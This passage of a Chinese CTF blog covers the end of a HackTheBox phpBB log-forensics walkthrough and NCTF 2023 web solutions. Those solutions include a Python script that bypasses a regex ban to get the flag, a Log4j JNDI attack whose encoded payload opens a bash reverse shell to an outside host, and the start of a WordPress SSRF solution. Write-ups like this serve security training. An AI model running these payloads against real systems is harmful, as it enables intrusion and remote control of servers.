class=&quot;footer-link-text&quot;&gt;</span><br><span class="line">                                Privacy</span><br><span class="line">                            &lt;/span&gt;</span><br><span class="line">                        &lt;/a&gt;</span><br><span class="line">                        |</span><br><span class="line">                        &lt;a class=&quot;footer-link&quot; href=&quot;./ucp.php?mode=terms&quot; title=&quot;Terms&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                            &lt;span class=&quot;footer-link-text&quot;&gt;</span><br><span class="line">                                Terms</span><br><span class="line">                            &lt;/span&gt;</span><br><span class="line">                        &lt;/a&gt;</span><br><span class="line">                    &lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div id=&quot;darkenwrapper&quot; class=&quot;darkenwrapper&quot; data-ajax-error-title=&quot;AJAX error&quot;</span><br><span class="line">                data-ajax-error-text=&quot;Something went wrong when processing your request.&quot;</span><br><span class="line">                data-ajax-error-text-abort=&quot;User aborted request.&quot; data-ajax-error-text-timeout=&quot;Your request timed out; please try again.&quot;</span><br><span class="line">                data-ajax-error-text-parsererror=&quot;Something went wrong with the request and the server returned an invalid reply.&quot;&gt;</span><br><span class="line">                    &lt;div id=&quot;darken&quot; class=&quot;darken&quot;&gt;</span><br><span class="line">                        &amp;nbsp;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div id=&quot;phpbb_alert&quot; class=&quot;phpbb_alert&quot; data-l-err=&quot;Error&quot; data-l-timeout-processing-req=&quot;Request timed out.&quot;&gt;</span><br><span class="line">                    &lt;a href=&quot;#&quot; class=&quot;alert_close&quot;&gt;</span><br><span class="line">                        &lt;i class=&quot;icon fa-times-circle fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                        &lt;/i&gt;</span><br><span class="line">                    &lt;/a&gt;</span><br><span class="line">                    &lt;h3 class=&quot;alert_title&quot;&gt;</span><br><span class="line">                        &amp;nbsp;</span><br><span class="line">                    &lt;/h3&gt;</span><br><span class="line">                    &lt;p class=&quot;alert_text&quot;&gt;</span><br><span class="line">                    &lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div id=&quot;phpbb_confirm&quot; class=&quot;phpbb_alert&quot;&gt;</span><br><span class="line">                    &lt;a href=&quot;#&quot; class=&quot;alert_close&quot;&gt;</span><br><span class="line">                        &lt;i class=&quot;icon fa-times-circle fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                        &lt;/i&gt;</span><br><span class="line">                    &lt;/a&gt;</span><br><span class="line">                    &lt;div class=&quot;alert_text&quot;&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            &lt;a id=&quot;bottom&quot; class=&quot;anchor&quot; accesskey=&quot;z&quot;&gt;</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line">            &lt;img src=&quot;./cron.php?cron_type=cron.task.core.tidy_warnings&quot; width=&quot;1&quot;</span><br><span class="line">            height=&quot;1&quot; alt=&quot;cron&quot;&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;span&gt;</span><br><span class="line">        Greetings everyone,</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        I am just a visiting IT Contractor, it&#x27;s a fantastic company y&#x27;all have</span><br><span class="line">        here.</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        I hope to work with you all again soon.</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        Regards,</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        Alex Poole</span><br><span class="line">    &lt;/span&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>成功找到<code>&lt;form action=&quot;http://10.10.0.78/update.php&quot; method=&quot;post&quot; id=&quot;login&quot; data-focus=&quot;username&quot;</code>，说明攻击者想上传到自己的ip上，url为<code>http://10.10.0.78/update.php</code></p>
<h2 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h2><p><strong>承包商什么时候以管理员身份登录论坛的？</strong></p>
<p>还是查表找到<code>phpbb_log</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from phpbb_log;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Bumblebee-HackTheBox/image-20240419102440293.png"></p>
<p>可以将时间戳<code>1682506392</code>转换为标准时间，脚本如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import datetime</span><br><span class="line">import pytz</span><br><span class="line"></span><br><span class="line">timestamp = 1682506392</span><br><span class="line">utc_timezone = pytz.timezone(&#x27;UTC&#x27;)</span><br><span class="line">dt = datetime.datetime.fromtimestamp(timestamp, utc_timezone)</span><br><span class="line">standard_time = dt.strftime(&#x27;%Y-%m-%d %H:%M:%S&#x27;)</span><br><span class="line"></span><br><span class="line">print(standard_time)</span><br></pre></td></tr></table></figure>

<h2 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h2><p><strong>论坛里有LDAP连接的明文凭据，密码是多少？</strong></p>
<p>查询一下<code>phpbb_config</code>配置文件里的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from phpbb_config;</span><br></pre></td></tr></table></figure>

<p>找到LDAP的密码<code>Passw0rd1</code></p>
<p><img src="/article/Bumblebee-HackTheBox/image-20240419103322104.png"></p>
<h2 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h2><p><strong>管理员用户的用户代理是什么？</strong></p>
<p>在数据库的 <code>phpbb_log</code> 表中，寻找 <code>operation</code> 为 <code>LOG_ADMIN_AUTH_SUCCESS</code> 的记录，可以找到这两条 ip</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.255.254.2</span><br><span class="line">10.10.0.78</span><br></pre></td></tr></table></figure>

<p>前面已经确定承包商的 ip 为 <code>10.10.0.78</code>，那么 <code>10.255.254.2</code> 就是管理员用户的 ip，在 <code>access.log</code> 中可以找到 <code>user-agent</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat access.log | grep &quot;10.255.254.2&quot;</span><br></pre></td></tr></table></figure>

<h2 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h2><p><strong>承包商什么时候将自己添加到管理员组？ （世界标准时间）</strong></p>
<p><code>phpbb_log</code>中有显示添加admin的时间戳，直接用前面脚本转换就行</p>
<h2 id="Task9"><a href="#Task9" class="headerlink" title="Task9"></a>Task9</h2><p><strong>承包商何时下载了数据库备份？</strong></p>
<p>在<code>access.log</code>筛选<code>backup</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat access.log | grep &quot;backup&quot;</span><br></pre></td></tr></table></figure>

<p>成功找到，不过要转换一下时区为<code>26/04/2023 11:01:38</code></p>
<p><img src="/article/Bumblebee-HackTheBox/image-20240419104642901.png"></p>
<h2 id="Task10"><a href="#Task10" class="headerlink" title="Task10"></a>Task10</h2><p><strong>access.log 中所述的数据库备份的大小（以字节为单位）是多少？</strong></p>
<p>直接看响应包就行了，大小为34707</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.10.0.78 - - [26/Apr/2023:12:01:38 +0100] &quot;GET /store/backup_1682506471_dcsr71p7fyijoyq8.sql.gz HTTP/1.1&quot; 200 34707 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>日志分析</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
      </tags>
  </entry>
  <entry>
    <title>NCTF 2023</title>
    <url>/article/NCTF2023.html</url>
    <content><![CDATA[<p>质量很高的比赛，收获满满</p>
<span id="more"></span>

<h1 id="NCTF-2023-web解析"><a href="#NCTF-2023-web解析" class="headerlink" title="[NCTF 2023]web解析"></a>[NCTF 2023]web解析</h1><h2 id="WaitWhat"><a href="#WaitWhat" class="headerlink" title="WaitWhat?"></a>WaitWhat?</h2><p>源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const child_process = require(&#x27;child_process&#x27;)</span><br><span class="line">const app = express()</span><br><span class="line">app.use(express.json())</span><br><span class="line">const port = 80</span><br><span class="line"></span><br><span class="line">function escapeRegExp(string) &#123;</span><br><span class="line">    return string.replace(/[.*+?^$&#123;&#125;()|[\]\\]/g, &#x27;\\$&amp;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let users = &#123;</span><br><span class="line">    &quot;admin&quot;: &quot;admin&quot;,</span><br><span class="line">    &quot;user&quot;: &quot;user&quot;,</span><br><span class="line">    &quot;guest&quot;: &quot;guest&quot;,</span><br><span class="line">    &#x27;hacker&#x27;:&#x27;hacker&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let banned_users = [&#x27;hacker&#x27;]</span><br><span class="line"></span><br><span class="line">// 你不准getflag</span><br><span class="line">banned_users.push(&quot;admin&quot;)</span><br><span class="line"></span><br><span class="line">let banned_users_regex = null;</span><br><span class="line">function build_banned_users_regex() &#123;</span><br><span class="line">	let regex_string = &quot;&quot;</span><br><span class="line">    for (let username of banned_users) &#123;</span><br><span class="line">        regex_string += &quot;^&quot; + escapeRegExp(username) + &quot;$&quot; + &quot;|&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    regex_string = regex_string.substring(0, regex_string.length - 1)</span><br><span class="line">    banned_users_regex = new RegExp(regex_string, &quot;g&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//鉴权中间件</span><br><span class="line">function requireLogin(req, res, next) &#123;</span><br><span class="line">    let username = req.body.username</span><br><span class="line">    let password = req.body.password</span><br><span class="line">    if (!username || !password) &#123;</span><br><span class="line">        res.send(&quot;用户名或密码不能为空&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    if (typeof username !== &quot;string&quot; || typeof password !== &quot;string&quot;) &#123;</span><br><span class="line">        res.send(&quot;用户名或密码不合法&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    // 基于正则技术的封禁用户匹配系统的设计与实现</span><br><span class="line">    let test1 = banned_users_regex.test(username)</span><br><span class="line">    console.log(`使用正则$&#123;banned_users_regex&#125;匹配$&#123;username&#125;的结果为：$&#123;test1&#125;`)</span><br><span class="line">    if (test1) &#123;</span><br><span class="line">		console.log(&quot;第一个判断匹配到封禁用户：&quot;,username)</span><br><span class="line">        res.send(&quot;用户&#x27;&quot;+username + &quot;&#x27;被封禁，无法鉴权！&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    // 基于in关键字的封禁用户匹配系统的设计与实现</span><br><span class="line">    let test2 = (username in banned_users)</span><br><span class="line">    console.log(`使用in关键字匹配$&#123;username&#125;的结果为：$&#123;test2&#125;`)</span><br><span class="line">    if (test2)&#123;</span><br><span class="line">        console.log(&quot;第二个判断匹配到封禁用户：&quot;,username)</span><br><span class="line">        res.send(&quot;用户&#x27;&quot;+username + &quot;&#x27;被封禁，无法鉴权！&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    if (username in users &amp;&amp; users[username] === password) &#123;</span><br><span class="line">        next()</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    res.send(&quot;用户名或密码错误，鉴权失败！&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function registerUser(username, password) &#123;</span><br><span class="line">    if (typeof username !== &quot;string&quot; || username.length &gt; 20) &#123;</span><br><span class="line">        return &quot;用户名不合法&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    if (typeof password !== &quot;string&quot; || password.length &gt; 20) &#123;</span><br><span class="line">        return &quot;密码不合法&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    if (username in users) &#123;</span><br><span class="line">        return &quot;用户已存在&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for(let existing_user in users)&#123;</span><br><span class="line">        let existing_user_password = users[existing_user]</span><br><span class="line">        if (existing_user_password === password)&#123;</span><br><span class="line">            return `您的密码已经被用户&#x27;$&#123;existing_user&#125;&#x27;使用了，请使用其它的密码`</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    users[username] = password</span><br><span class="line">    return &quot;注册成功&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.use(express.static(&#x27;public&#x27;))</span><br><span class="line"></span><br><span class="line">// 每次请求前，更新封禁用户正则信息</span><br><span class="line">app.use(function (req, res, next) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        build_banned_users_regex()</span><br><span class="line">		console.log(&quot;封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）：&quot;,banned_users_regex)</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    next()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(&quot;/api/register&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    let username = req.body.username</span><br><span class="line">    let password = req.body.password</span><br><span class="line">    let message = registerUser(username, password)</span><br><span class="line">    res.send(message)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(&quot;/api/login&quot;, requireLogin, (req, res) =&gt; &#123;</span><br><span class="line">    res.send(&quot;登录成功！&quot;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(&quot;/api/flag&quot;, requireLogin, (req, res) =&gt; &#123;</span><br><span class="line">    let username = req.body.username</span><br><span class="line">    if (username !== &quot;admin&quot;) &#123;</span><br><span class="line">        res.send(&quot;登录成功，但是只有&#x27;admin&#x27;用户可以看到flag，你的用户名是&#x27;&quot; + username + &quot;&#x27;&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    let flag = child_process.execSync(&quot;cat flag&quot;).toString()</span><br><span class="line">    res.end(flag)</span><br><span class="line">    console.error(&quot;有人获取到了flag！为了保证题目的正常运行，将会重置靶机环境！&quot;)</span><br><span class="line">    res.on(&quot;finish&quot;, () =&gt; &#123;</span><br><span class="line">        setTimeout(() =&gt; &#123; process.exit(0) &#125;, 1)</span><br><span class="line">    &#125;)</span><br><span class="line">    return</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(&#x27;/api/ban_user&#x27;, requireLogin, (req, res) =&gt; &#123;</span><br><span class="line">    let username = req.body.username</span><br><span class="line">    let ban_username = req.body.ban_username</span><br><span class="line">    if(!ban_username)&#123;</span><br><span class="line">        res.send(&quot;ban_username不能为空&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    if(username === ban_username)&#123;</span><br><span class="line">        res.send(&quot;不能封禁自己&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    for (let name of banned_users)&#123;</span><br><span class="line">        if (name === ban_username) &#123;</span><br><span class="line">            res.send(&quot;用户已经被封禁&quot;)</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    banned_users.push(ban_username)</span><br><span class="line">    res.send(&quot;封禁成功！&quot;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(&quot;/&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    res.redirect(&quot;/static/index.html&quot;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(port, () =&gt; &#123;</span><br><span class="line">    console.log(`listening on port $&#123;port&#125;`)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>代码很长我们分析一下：</p>
<p>首先定义escapeRegExp函数去进行转义，给了user数组包含四个用户和对应密码，然后定义banned_users数组并随后通过push添加admin用户为黑名单</p>
<p>然后看向build_banned_users_regex()函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let banned_users_regex = null;</span><br><span class="line">function build_banned_users_regex() &#123;</span><br><span class="line">	let regex_string = &quot;&quot;</span><br><span class="line">    for (let username of banned_users) &#123;</span><br><span class="line">        regex_string += &quot;^&quot; + escapeRegExp(username) + &quot;$&quot; + &quot;|&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    regex_string = regex_string.substring(0, regex_string.length - 1)</span><br><span class="line">    banned_users_regex = new RegExp(regex_string, &quot;g&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对传入的username进行正则匹配，然后截断也就是<code>/^admin$/</code>，最后启用了参数g</p>
<p>和它有关的是<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/lastIndex">lastIndex</a>属性</p>
<p><strong>RegExp.lastIndex</strong></p>
<blockquote>
<p><code>lastIndex</code> 是正则表达式的一个可读可写的整型属性，用来指定下一次匹配的起始索引。</p>
</blockquote>
<p>只有正则表达式使用了表示全局检索的 “<code>g</code>“ 或者粘性检索的 “<code>y</code>“ 标志时，该属性才会起作用。此时应用下面的规则：</p>
<ul>
<li>如果 <code>lastIndex</code> 大于字符串的长度，则 <code>regexp.test</code> 和 <code>regexp.exec</code> 将会匹配失败，然后 <code>lastIndex</code> 被设置为 0。</li>
<li>如果 <code>lastIndex</code> 等于或小于字符串的长度，则该正则表达式匹配从 <code>lastIndex</code> 位置开始的字符串。    <ul>
<li>如果 <code>regexp.test</code> 和 <code>regexp.exec</code> 匹配成功，<code>lastIndex</code> 会被设置为紧随最近一次成功匹配的下一个位置。</li>
<li>如果 <code>regexp.test</code> 和 <code>regexp.exec</code> 匹配失败，<code>lastIndex</code> 会被设置为 0</li>
</ul>
</li>
</ul>
<p>我们本地测试下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var re = /^admin$/g;</span><br><span class="line">console.log(re.test(&#x27;admin&#x27;))</span><br><span class="line">console.log(&quot;第一次：&quot;+re.lastIndex)</span><br><span class="line">console.log(re.test(&#x27;admin&#x27;))</span><br><span class="line">console.log(&quot;第二次：&quot;+re.lastIndex)</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="/article/NCTF2023/image-20240401201000544.png"></p>
<p>不难发现如果正则表达式设置了全局标志， test() 的执行会改变正则表达式 lastIndex 属性。连续的执行 test() 方法，后续的执行将会从lastIndex处开始匹配字符串</p>
<p>我们继续往下看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//鉴权中间件</span><br><span class="line">function requireLogin(req, res, next) &#123;</span><br><span class="line">    let username = req.body.username</span><br><span class="line">    let password = req.body.password</span><br><span class="line">    if (!username || !password) &#123;</span><br><span class="line">        res.send(&quot;用户名或密码不能为空&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    if (typeof username !== &quot;string&quot; || typeof password !== &quot;string&quot;) &#123;</span><br><span class="line">        res.send(&quot;用户名或密码不合法&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    // 基于正则技术的封禁用户匹配系统的设计与实现</span><br><span class="line">    let test1 = banned_users_regex.test(username)</span><br><span class="line">    console.log(`使用正则$&#123;banned_users_regex&#125;匹配$&#123;username&#125;的结果为：$&#123;test1&#125;`)</span><br><span class="line">    if (test1) &#123;</span><br><span class="line">		console.log(&quot;第一个判断匹配到封禁用户：&quot;,username)</span><br><span class="line">        res.send(&quot;用户&#x27;&quot;+username + &quot;&#x27;被封禁，无法鉴权！&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    // 基于in关键字的封禁用户匹配系统的设计与实现</span><br><span class="line">    let test2 = (username in banned_users)</span><br><span class="line">    console.log(`使用in关键字匹配$&#123;username&#125;的结果为：$&#123;test2&#125;`)</span><br><span class="line">    if (test2)&#123;</span><br><span class="line">        console.log(&quot;第二个判断匹配到封禁用户：&quot;,username)</span><br><span class="line">        res.send(&quot;用户&#x27;&quot;+username + &quot;&#x27;被封禁，无法鉴权！&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    if (username in users &amp;&amp; users[username] === password) &#123;</span><br><span class="line">        next()</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    res.send(&quot;用户名或密码错误，鉴权失败！&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>requireLogin()函数起到了鉴权作用，设置了两套waf，分别是正则技术和in关键字，要想登陆成功就必须绕过waf。</p>
<p>第一个我们前文已经知道banned_users_regex()函数的具体执行过程，test()返回一个布尔值，由于我们刚刚测试过设置了全局标志，连续的执行 test() 方法会使其布尔值发生改变，我们往下看在app.use处发现会更新封禁用户正则信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 每次请求前，更新封禁用户正则信息</span><br><span class="line">app.use(function (req, res, next) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        build_banned_users_regex()</span><br><span class="line">		console.log(&quot;封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）：&quot;,banned_users_regex)</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    next()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>我们要让其不更新正则信息利用test()多次执行返回false的布尔值绕过第一个waf，也就是说我们要抛出异常。</p>
<p>我们注意到banned_users_regex()函数中escapeRegExp()定义的是接收string类型的，如果传递非字符串类型就可以实现抛出TypeError</p>
<p>第二个waf根据注释是基于<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/in">in关键字</a>我们来分析一下</p>
<blockquote>
<p>如果指定的属性在指定的对象或其原型链中，则 <strong><code>in</code></strong> <strong>运算符</strong>返回 <code>true</code>。</p>
</blockquote>
<p>我们本地测试下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const list = &#123;id:&#x27;1&#x27;,grade:&#x27;100&#x27;,name:&#x27;rev1ve&#x27;&#125;</span><br><span class="line">console.log(list)</span><br><span class="line">if(&#x27;name&#x27; in list === true)&#123;</span><br><span class="line">    console.log(&#x27;name is in list!&#x27;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果<br><img src="/article/NCTF2023/image-20240401201015290.png"></p>
<p>说明指定的是属性，那如果是数组呢，给个示例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const banned_users = [&#x27;hacker&#x27;,&#x27;admin&#x27;]</span><br><span class="line">username=&#x27;admin&#x27;</span><br><span class="line">let test1 = (username in banned_users)</span><br><span class="line">if(test1)&#123;</span><br><span class="line">    console.log(&#x27;waffff&#x27;)</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    console.log(&#x27;success!&#x27;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于没有admin属性，所以test1布尔值返回为false，也就是说这是假的waf（hhh）</p>
<p>接着往下看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function registerUser(username, password) &#123;</span><br><span class="line">    if (typeof username !== &quot;string&quot; || username.length &gt; 20) &#123;</span><br><span class="line">        return &quot;用户名不合法&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    if (typeof password !== &quot;string&quot; || password.length &gt; 20) &#123;</span><br><span class="line">        return &quot;密码不合法&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    if (username in users) &#123;</span><br><span class="line">        return &quot;用户已存在&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for(let existing_user in users)&#123;</span><br><span class="line">        let existing_user_password = users[existing_user]</span><br><span class="line">        if (existing_user_password === password)&#123;</span><br><span class="line">            return `您的密码已经被用户&#x27;$&#123;existing_user&#125;&#x27;使用了，请使用其它的密码`</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    users[username] = password</span><br><span class="line">    return &quot;注册成功&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>registerUser函数就是检查用户名和密码是否合法</p>
<p>然后就是<code>/api/register</code>路由和有鉴权过程的<code>/api/login</code>路由没有什么信息，<code>/api/flag</code>路由要想得到flag就得绕过waf，以admin身份登录即可，<code>/api/ban_user</code>路由实现抛出异常</p>
<p>整理一下思路：首先随便注册一个用户test，然后访问<code>/api/ban_user</code>路由传数组格式抛出异常绕过regex的更新，然后进行第一次访问<code>/api/flag</code>路由正则匹配成功，waf成功拦截，接着第二次访问<code>/api/flag</code>路由，正则匹配失败，成功绕过waf得到flag</p>
<p>脚本如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">req=requests.Session()</span><br><span class="line">url=&#x27;http://117.50.175.234:9001/&#x27;</span><br><span class="line"></span><br><span class="line">req1=req.post(url+&quot;api/register&quot;,json=&#123;&quot;username&quot;:&quot;test&quot;,&quot;password&quot;:&quot;test&quot;&#125;)</span><br><span class="line">print(req1.text)</span><br><span class="line"></span><br><span class="line">req2=req.post(url+&quot;api/ban_user&quot;,json=&#123;&quot;username&quot;:&quot;test&quot;,&quot;password&quot;:&quot;test&quot;,&quot;ban_username&quot;:&#123;&quot;error&quot;:&quot;&quot;&#125;&#125;)</span><br><span class="line">print(req2.text)</span><br><span class="line"></span><br><span class="line">req3=req.post(url+&quot;api/flag&quot;,json=&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125;)</span><br><span class="line">print(req3.text)</span><br><span class="line"></span><br><span class="line">req4=req.post(url+&quot;api/flag&quot;,json=&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125;)</span><br><span class="line">print(req4.text)</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="/article/NCTF2023/image-20240401201030505.png"></p>
<h2 id="logging"><a href="#logging" class="headerlink" title="logging"></a>logging</h2><blockquote>
<p>考点：log4j rce (CVE-2021-44228)</p>
</blockquote>
<p>我们将题目给的jar文件反编译一下，找到pom.xml文件<br><img src="/article/NCTF2023/image-20240401201126614.png"><br>可以知道是springboot框架，结合提示是log4j的远程RCE<br>目标就是找到注入点触发log4j的漏洞</p>
<p><strong>参考wp</strong></p>
<blockquote>
<p>如何实现SpringBoot在默认配置下如何触发Log4j2 JNDI RCE（默认配置是指代码仅仅使用了Log4j2的依赖）<br>核心思路就是：构造⼀个畸形的HTTP数据包使得SpringBoot控制台报错</p>
</blockquote>
<p>本题利用的是http请求的Accept头，接下来就是JNDI常规注入<br>使用工具<code>rogue-jndi</code>，由于之前做的log4j漏洞是htb能出网的机子(参考文章)，所以本题需要修改下参数值<br>映射端口如下<br><img src="/article/NCTF2023/image-20240401201220929.png"><br>运行工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar target/RogueJndi-1.1.jar --command &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC81aTc4MTk2M3AyLnlpY3AuZnVuLzU4MjY1IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; --hostname &quot;192.168.132.128&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/article/NCTF2023/image-20240401201235782.png"></p>
<p>选择第三个，抓包在Accept头添加payload<br>然后修改一下ip地址（因为是内网穿透）</p>
<p><img src="/article/NCTF2023/image-20240401201246801.png"></p>
<p>成功反弹shell得到flag</p>
<p><img src="/article/NCTF2023/image-20240401201329986.png"></p>
<h2 id="ez-wordpress"><a href="#ez-wordpress" class="headerlink" title="ez_wordpress"></a>ez_wordpress</h2><p>打开题目，没什么收获看看hint</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hint 1: 可以思考下如何对 WordPress 进行信息收集</span><br><span class="line"></span><br><span class="line">Hint 2: 注意版本 (6.4.1) 注意一些第三方的东西</span><br><span class="line"></span><br><span class="line">Hint 3: 结合信息收集和网上已有的东西就可以自己本地搭建一个类似的环境进行测试 涉及的代码审计部分其实很少</span><br><span class="line"></span><br><span class="line">Hint 4: https://wwnt.lanzout.com/iwUdK1ir03te</span><br><span class="line"></span><br><span class="line">Hint 5: upload phar + file read (ssrf) =&gt; rce</span><br><span class="line"></span><br><span class="line">Hint 6: 请不要使用 burp 的 Paste from file 功能 (存在 bug) 建议手动构造 upload.html 然后浏览器选择文件抓取上传包 或者写 python 脚本上传 或者使用 yakit </span><br></pre></td></tr></table></figure>

<p>hint1应该是能通过wpscan扫出来有用的线索，刚好hint4是给的扫描结果；然后hint2说注意版本以及第三方东西，应该就是插件</p>
<p>那么我们看一下扫描结果</p>
<p><img src="/article/NCTF2023/image-20231229143529891.png"></p>
<p>果然是扫出来几个插件，重点看向all-in-one-video-gallery和drag-and-drop-multiple-file-upload-contact-form-7以及对应的版本</p>
<p>我们根据关键词搜出来all-in-one-video-gallery插件具有ssrf和文件读取漏洞并且知道对应cve漏洞编号</p>
<p><img src="/article/NCTF2023/image-20231229140607931.png"></p>
<p>在网上找到篇文章如何构造ssrf漏洞 <a href="https://blog.amanrawat.in/2022/09/28/CVE-2022-2633.html">参考链接</a></p>
<p>在<code>/index.php/video</code>路由下存在dl参数，如果不为数字则对其base64解码</p>
